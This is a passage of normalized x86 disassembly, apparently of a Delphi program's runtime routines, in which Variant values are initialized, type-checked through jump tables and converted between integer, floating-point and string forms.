pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f550
retn
sub_412ae0
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_413017
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412b19 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ff8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403fa4
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ff8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4099e8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4099e8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ff8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4127f8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40422c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412830
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40422c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047c0
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_40422c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_412868
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40422c
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4084f4
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ff8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4084f4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412ae0
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41292c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ff8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41301e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403fc8
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4046c8
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403fc8
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4046c8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4129f8
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ff8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ff8
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40ed6c
test ah 0x40
je r-xdata
mov eax esi
call sub_403fa4
mov edx eax
mov eax ebx
call sub_412a5c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_41292c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ff8
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_41292c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ff8
jmp r-xdata
jmp [ eax * 4 + jump_table_412dad ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408408
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4099e8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4099e8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4127f8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40422c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412830
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40422c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4041cc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412868
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40422c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ff8
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4084f4
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4084f4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ff8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412ae0
jmp r-xdata
sub_413024
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4130ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4130b1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40f1ac
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047c0
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130b8
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_4130dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413132
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f878
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_413208
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413139
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_413140
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4131f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415bdc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131ff
lea eax [ ebp - 0x20 ]
call sub_4046b0
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4131db
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4047c0
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f550
retn
sub_413208
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41375a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_413242 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047fc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4046b0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047fc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4099e8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047fc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4099e8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047fc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_4127f8
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046ec
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412830
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046ec
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4047c0
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_412868
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046ec
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408408
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4084f4
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047fc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4084f4
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413208
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_413024
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413761
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046c8
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046c8
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fc8
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046c8
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046c8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4130dc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046ec
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047fc
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40ed6c
test ah 0x40
je r-xdata
mov eax esi
call sub_4046b0
mov edx eax
mov eax ebx
call sub_413140
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_413024
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046ec
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_413024
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046ec
jmp r-xdata
jmp [ eax * 4 + jump_table_4134c9 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408408
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4099e8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4099e8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_4127f8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046ec
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412830
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046ec
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4047c0
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412868
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046ec
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047fc
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408408
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4084f4
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4084f4
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413208
jmp r-xdata
sub_413768
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4137d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f878
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137d9
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
mov dx 0xd
mov ax 0x101
call sub_40ed6c
sub_4137e0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_413768
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405a20
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405a20
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405a08
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415bdc
test al al
je r-xdata
mov eax esi
call sub_405a08
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40ed6c
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40ed6c
mov eax esi
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403308
test al al
jne r-xdata
sub_4138ac
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405a08
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405a08
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40ed6c
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405a20
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405a20
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415bdc
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40ed6c
mov eax esi
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403308
test al al
jne r-xdata
sub_413958
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f4d4
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413994
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_4139b4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f4d4
sub_4139d4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_4139f4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413a14
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f4d4
sub_413a34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413a54
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f4d4
sub_413a80
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f4d4
sub_413aa4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f4d4
sub_413ad0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f4d4
sub_413afc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f4d4
sub_413b28
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f4d4
sub_413b8c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ff8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413bb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413bfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404208
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c02
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_413c08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4048ac
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413c40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405a20
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413c6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405a20
pop esi
pop ebx
retn
mov eax ebx
call sub_40f4d4
sub_413c98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413cdb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4047fc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ce2
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_413ce8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f878
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d45
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_413d54
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413d54
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f4d4
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_413c98
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_413ce8
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fdbc
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fdbc
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_413d4c
mov edx ebx
mov eax esi
call sub_40f5f8
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fdbc
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fdbc
jmp r-xdata
mov edx esp
mov eax edi
call sub_415bdc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f878
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fdbc
jmp r-xdata
jmp r-xdata
call sub_40ed18
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_414028
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41414e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
